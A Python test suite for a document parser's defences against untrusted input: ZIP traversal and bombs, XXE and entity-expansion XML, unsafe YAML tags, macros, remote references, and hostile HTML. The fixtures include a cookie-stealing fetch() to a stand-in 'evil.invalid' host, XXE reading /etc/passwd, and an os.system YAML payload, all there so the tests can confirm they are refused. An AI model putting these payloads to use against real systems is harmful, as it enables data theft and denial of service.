"""Untrusted-document safety: ZIP bombs, traversal, XML entities, limits.

A document is attacker-controlled input handed to permissive third-party
libraries. These checks pin the boundary: what is REFUSED outright, what is
truncated with an explicit warning, and what is never done at all (executing a
formula, running a script, fetching a remote reference).
"""
import io
import os
import sys
import tempfile
import zipfile

os.environ.setdefault("OPENMIND_DATA_DIR", tempfile.mkdtemp())
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _isolate  # noqa: E402,F401

from pathlib import Path  # noqa: E402

from openmind.documents import parse_bytes, security  # noqa: E402
from openmind.documents.models import DocumentLimits  # noqa: E402
from openmind.domain.types import DocumentParseStatus  # noqa: E402

_results = []
FIXTURES = Path(__file__).resolve().parent.parent / "fixtures" / "documents"
LIMITS = dict(max_members=100, max_total_bytes=1_000_000,
              max_member_bytes=500_000, max_ratio=50)


def check(desc, cond):
    _results.append((desc, bool(cond)))
    print(("PASS" if cond else "FAIL") + " - " + desc)


def make_zip(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members:
            zf.writestr(name, data)
    return buf.getvalue()


def stored_names(data):
    """The member names as the archive ACTUALLY holds them.

    ``ZipInfo.__init__`` rewrites ``os.sep`` to ``/``, so a member written as
    ``..\\..\\x`` is stored with forward slashes on Windows and verbatim with
    backslashes on Linux. Asserting against the requested name would therefore
    pass on one OS and fail on the other — which is exactly what happened.
    """
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        return zf.namelist()


def refuses(data, code, **overrides):
    limits = dict(LIMITS)
    limits.update(overrides)
    try:
        security.inspect_zip(data, **limits)
    except security.DocumentSecurityError as exc:
        return exc.code == code, exc
    return False, None


# ---------------------------------------------------------------------------
# 1. ZIP path traversal
# ---------------------------------------------------------------------------
for member, label in (("../../etc/passwd", "posix parent traversal"),
                      ("..\\..\\windows\\system32\\x", "windows traversal"),
                      ("/etc/shadow", "absolute posix path"),
                      ("C:/Windows/x", "windows drive path"),
                      ("a/../../b", "traversal in the middle")):
    archive = make_zip([(member, b"x")])
    ok, exc = refuses(archive, "zip-path-traversal")
    check(f"zip: {label} is refused", ok)
    check(f"zip: the {label} refusal names the member as stored",
          bool(exc) and str(exc.detail.get("member", "")) == stored_names(archive)[0])

ok, _ = refuses(make_zip([("word/document.xml", b"<x/>"), ("a/b/c.xml", b"x")]),
                "zip-path-traversal")
check("zip: an ordinary nested member is NOT refused", not ok)

# The predicate itself, independent of what zipfile stored. On Linux a member
# name keeps its backslashes (backslash is a legal POSIX filename character),
# so the detector has to normalize them itself rather than relying on the
# archive having done it.
from openmind.documents.security import _is_traversal  # noqa: E402

for raw, expected in ((r"..\..\windows\system32\x", True),
                      ("../../etc/passwd", True),
                      (r"C:\Windows\x", True),
                      ("/etc/shadow", True),
                      (r"a\b\c.xml", False),
                      ("word/document.xml", False),
                      ("a..b/c.xml", False)):
    check(f"zip: traversal detection for {raw!r} is {expected}",
          _is_traversal(raw) is expected)

# ---------------------------------------------------------------------------
# 2. Expansion caps
# ---------------------------------------------------------------------------
ok, exc = refuses(make_zip([(f"m{i}.txt", b"x") for i in range(200)]),
                  "zip-too-many-members")
check("zip: too many members is refused", ok)
check("zip: the member-count refusal reports observed vs limit",
      bool(exc) and exc.detail.get("observed", 0) > exc.detail.get("limit", 0))

# A zip bomb: highly compressible content that expands enormously.
bomb = make_zip([("bomb.txt", b"\0" * 4_000_000)])
ok, exc = refuses(bomb, "zip-ratio-suspicious", max_member_bytes=100_000_000,
                  max_total_bytes=100_000_000)
check("zip: a decompression bomb is refused by its compression ratio", ok)
check("zip: the bomb refusal reports the observed ratio",
      bool(exc) and exc.detail.get("ratio", 0) > exc.detail.get("limit", 0))

ok, _ = refuses(make_zip([("big.bin", os.urandom(200_000))]),
                "zip-member-too-large", max_member_bytes=50_000)
check("zip: an oversized member is refused", ok)

ok, _ = refuses(make_zip([(f"m{i}.bin", os.urandom(40_000)) for i in range(6)]),
                "zip-too-large", max_total_bytes=100_000,
                max_member_bytes=10_000_000)
check("zip: an oversized total expansion is refused", ok)

ok, _ = refuses(b"this is not a zip at all", "bad-zip")
check("zip: a non-ZIP is refused with a clear code", ok)

# A real fixture must pass every cap.
real = security.inspect_zip((FIXTURES / "sample-requirements.docx").read_bytes(),
                            max_members=2000, max_total_bytes=400_000_000,
                            max_member_bytes=100_000_000, max_ratio=200)
check("zip: a legitimate DOCX passes every cap",
      "word/document.xml" in real["members"])

# ---------------------------------------------------------------------------
# 3. The caps are enforced by the PARSER, not just the helper
# ---------------------------------------------------------------------------
traversal_docx = make_zip([
    ("[Content_Types].xml", b"<Types/>"),
    ("word/document.xml", b"<document/>"),
    ("../escape.xml", b"<x/>"),
])
parsed = parse_bytes(traversal_docx, logical_key="documents/evil.docx",
                     filename="evil.docx")
check("docx: a package containing a traversal member is NOT parsed",
      parsed.status == DocumentParseStatus.UNSUPPORTED)
check("docx: the refusal reason is the security code",
      parsed.reason == "zip-path-traversal")
check("docx: the refusal is recorded as a warning",
      any(w.code == "zip-path-traversal" for w in parsed.warnings))
check("docx: nothing was extracted from the refused package",
      not [b for b in parsed.blocks if b.indexable])

# ---------------------------------------------------------------------------
# 4. XML external entities are disabled
# ---------------------------------------------------------------------------
check("xml: hardening is available and in force", security.harden_xml() is True)
check("xml: xml_hardened() reports the applied state",
      security.xml_hardened() is True)

import xml.etree.ElementTree as _ET  # noqa: E402

xxe = b"""<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>"""
blocked = False
try:
    _ET.fromstring(xxe.decode())
except Exception:
    blocked = True
check("xml: an external ENTITY declaration is refused by the stdlib parser",
      blocked)

billion = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>"""
expanded = False
try:
    _ET.fromstring(billion.decode())
except Exception:
    expanded = True
check("xml: an entity-expansion bomb is refused", expanded)

# A document may DECLARE an external DTD without referencing an entity from it.
# Hardening does not reject the declaration — it makes the parser never retrieve
# it — so the property under test is "no network fetch, and no content from it",
# not "raises".
dtd = b"""<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://example.invalid/evil.dtd">
<root>x</root>"""
fetched = False
try:
    node = _ET.fromstring(dtd.decode())
    fetched = (node.text or "") != "x"
except Exception:
    fetched = False        # refusing outright is also acceptable
check("xml: an external DTD is never retrieved", fetched is False)

# The entity case IS refused, because resolving it would require the fetch.
dtd_entity = b"""<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://example.invalid/evil.dtd" [
 <!ENTITY remote SYSTEM "http://example.invalid/secret">
]>
<root>&remote;</root>"""
entity_blocked = False
try:
    _ET.fromstring(dtd_entity.decode())
except Exception:
    entity_blocked = True
check("xml: an entity declared against an external DTD is refused",
      entity_blocked)

# ---------------------------------------------------------------------------
# 5. Formulas are never executed
# ---------------------------------------------------------------------------
_, = (0,)
xlsx = parse_bytes((FIXTURES / "sample-tests.xlsx").read_bytes(),
                   logical_key="documents/t.xlsx", filename="t.xlsx")
formula_text = " ".join(b.text for b in xlsx.blocks)
check("xlsx: the formula TEXT is what is stored", "=COUNTA(" in formula_text)
check("xlsx: no evaluated result is substituted for the formula",
      not any(b.metadata.get("has_formula") and b.text.rstrip().endswith(": 4")
              for b in xlsx.blocks))
check("xlsx: formula-bearing cells are flagged as such",
      any(b.metadata.get("has_formula") for b in xlsx.blocks))
check("xlsx: an external workbook link is not followed",
      "example.invalid" not in formula_text)

macro_xlsx = make_zip([
    ("[Content_Types].xml", b"<Types/>"),
    ("xl/workbook.xml", b"<workbook/>"),
    ("xl/vbaProject.bin", b"\x00\x01macro payload"),
])
macro = parse_bytes(macro_xlsx, logical_key="documents/m.xlsm",
                    filename="m.xlsm")
check("xlsx: a macro-enabled workbook is NOT claimed by the xlsx parser",
      macro.parser_name != "xlsx")
check("xlsx: the macro payload is never surfaced as content",
      "macro payload" not in " ".join(b.text for b in macro.blocks))

# ---------------------------------------------------------------------------
# 6. HTML: scripts, styles and hidden content are ignored
# ---------------------------------------------------------------------------
hostile = b"""<html><head><title>T</title>
<script>fetch('http://evil.invalid/steal?d='+document.cookie)</script>
<style>body{background:url('http://evil.invalid/x')}</style></head>
<body><p>real content</p>
<p hidden>hidden secret</p>
<noscript>noscript secret</noscript>
<img src="http://evil.invalid/track.gif">
</body></html>"""
html = parse_bytes(hostile, logical_key="documents/h.html", filename="h.html")
body = " ".join(b.text for b in html.blocks)
check("html: script content is not indexed", "evil.invalid" not in body)
check("html: the cookie-stealing script text is absent",
      "document.cookie" not in body)
check("html: style content is not indexed", "background" not in body)
check("html: hidden content is not indexed", "hidden secret" not in body)
check("html: noscript content is not indexed", "noscript secret" not in body)
check("html: real content IS indexed", "real content" in body)
check("html: an image is recorded, not fetched",
      any(u.kind == "image" for u in html.unsupported_content))

# ---------------------------------------------------------------------------
# 7. Remote references are never fetched
# ---------------------------------------------------------------------------
remote_schema = b"""{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "title": "R", "type": "object",
  "properties": {"a": {"$ref": "https://example.invalid/remote.json"}},
  "$defs": {"B": {"type": "string"}}
}"""
schema = parse_bytes(remote_schema, logical_key="documents/r.json",
                     filename="r.json")
check("json-schema: a remote $ref is recorded as unsupported",
      any(u.kind == "external-reference" for u in schema.unsupported_content))
check("json-schema: the remote $ref is left unresolved",
      not any("resolved type" in b.text and "example.invalid" in b.text
              for b in schema.blocks))
check("json-schema: the parse still succeeds without the remote target",
      schema.status == DocumentParseStatus.PARSED)

remote_api = b"""openapi: 3.0.0
info: {title: R, version: '1'}
paths:
  /x:
    get:
      responses:
        '200':
          content:
            application/json:
              schema:
                $ref: 'https://example.invalid/schemas/x.json'
"""
api = parse_bytes(remote_api, logical_key="documents/r.yaml", filename="r.yaml")
check("openapi: a remote $ref is recorded as unsupported",
      any(u.kind == "external-reference" for u in api.unsupported_content))

# YAML must never construct arbitrary Python objects.
evil_yaml = (b"openapi: 3.0.0\ninfo: {title: X, version: '1'}\n"
             b"paths: !!python/object/apply:os.system ['echo pwned']\n")
yaml_doc = parse_bytes(evil_yaml, logical_key="documents/e.yaml",
                       filename="e.yaml")
check("openapi: a YAML python/object tag is refused (safe_load only)",
      yaml_doc.status in (DocumentParseStatus.UNSUPPORTED,
                          DocumentParseStatus.FAILED))

# ---------------------------------------------------------------------------
# 8. Oversized inputs
# ---------------------------------------------------------------------------
big_pdf = parse_bytes((FIXTURES / "sample-design.pdf").read_bytes(),
                      logical_key="documents/b.pdf", filename="b.pdf",
                      limits=DocumentLimits(max_bytes=200))
check("an oversized PDF is refused before parsing",
      big_pdf.status == DocumentParseStatus.UNSUPPORTED)
check("the oversize refusal names DOCUMENT_MAX_BYTES",
      any(w.detail.get("limit") == "DOCUMENT_MAX_BYTES"
          for w in big_pdf.warnings))

huge_xlsx = parse_bytes((FIXTURES / "sample-tests.xlsx").read_bytes(),
                        logical_key="documents/h.xlsx", filename="h.xlsx",
                        limits=DocumentLimits(xlsx_max_cells=3))
check("an oversized workbook becomes partial, per policy",
      huge_xlsx.status == DocumentParseStatus.PARTIAL)
check("the workbook cap is named in the warning",
      any(w.detail.get("limit") in ("XLSX_MAX_CELLS", "XLSX_MAX_ROWS_PER_SHEET")
          for w in huge_xlsx.warnings))
check("content read before the cap is KEPT, not discarded",
      any(b.text.strip() for b in huge_xlsx.blocks))

blocky = parse_bytes(b"\n\n".join(b"paragraph %d" % i for i in range(50)),
                     logical_key="documents/many.txt", filename="many.txt",
                     limits=DocumentLimits(max_blocks=5))
check("a block-count cap produces partial",
      blocky.status == DocumentParseStatus.PARTIAL)
check("the block cap emits exactly ONE warning, not one per refused block",
      sum(1 for w in blocky.warnings
          if w.detail.get("limit") == "DOCUMENT_MAX_BLOCKS") == 1)
check("the block cap is actually enforced", len(blocky.blocks) <= 5)

long_block = parse_bytes(b"# T\n\n" + b"x" * 5000,
                         logical_key="documents/l.md", filename="l.md",
                         limits=DocumentLimits(max_block_chars=200))
check("an oversized block is truncated to the limit",
      all(len(b.text) <= 200 for b in long_block.blocks))
check("block truncation is REPORTED, never silent",
      long_block.status == DocumentParseStatus.PARTIAL
      and any(w.detail.get("limit") == "DOCUMENT_MAX_BLOCK_CHARS"
              for w in long_block.warnings))
check("a truncated block says so in its text",
      any("truncated by OpenMind" in b.text for b in long_block.blocks))

# ---------------------------------------------------------------------------
# 9. Decoding never fails, and a lossy decode is disclosed
# ---------------------------------------------------------------------------
text, encoding, lossy = security.decode_text("héllo wörld".encode("utf-8"))
check("decode: UTF-8 round-trips", text == "héllo wörld" and not lossy)
text, encoding, lossy = security.decode_text(b"\xff\xfeh\x00i\x00")
check("decode: a UTF-16 BOM is honoured", text == "hi")
text, encoding, lossy = security.decode_text(b"caf\xe9 latte")
check("decode: undecodable UTF-8 falls back rather than raising",
      text.startswith("caf") and text.endswith(" latte"))
check("decode: a single-byte fallback is NOT mis-decoded as UTF-16",
      encoding in ("cp1252", "latin-1"))
mixed = parse_bytes(b"# T\n\ncaf\xe9 body\n", logical_key="documents/m.md",
                    filename="m.md")
check("decode: a document with a non-UTF-8 encoding still parses",
      mixed.status in (DocumentParseStatus.PARSED, DocumentParseStatus.PARTIAL))
check("decode: the encoding actually used is recorded",
      bool(mixed.metadata.extra.get("encoding")))

# ---------------------------------------------------------------------------
# 10. A malformed document never escalates into a crash
# ---------------------------------------------------------------------------
for name, payload in (("truncated docx", (FIXTURES / "sample-requirements.docx")
                       .read_bytes()[:400]),
                      ("truncated pdf", (FIXTURES / "sample-design.pdf")
                       .read_bytes()[:120]),
                      ("truncated xlsx", (FIXTURES / "sample-tests.xlsx")
                       .read_bytes()[:300]),
                      ("empty file", b""),
                      ("random bytes", os.urandom(4096))):
    result = parse_bytes(payload, logical_key="documents/x", filename="x")
    check(f"a {name} returns a status instead of raising",
          result.status in DocumentParseStatus.VALUES)
    check(f"a {name} never claims to be fully parsed with fabricated content",
          result.status != DocumentParseStatus.PARSED
          or not [b for b in result.blocks if b.indexable])

# ---------------------------------------------------------------------------
bad = [d for d, ok in _results if not ok]
print(f"\n{len(_results) - len(bad)} passed, {len(bad)} failed")
sys.exit(1 if bad else 0)
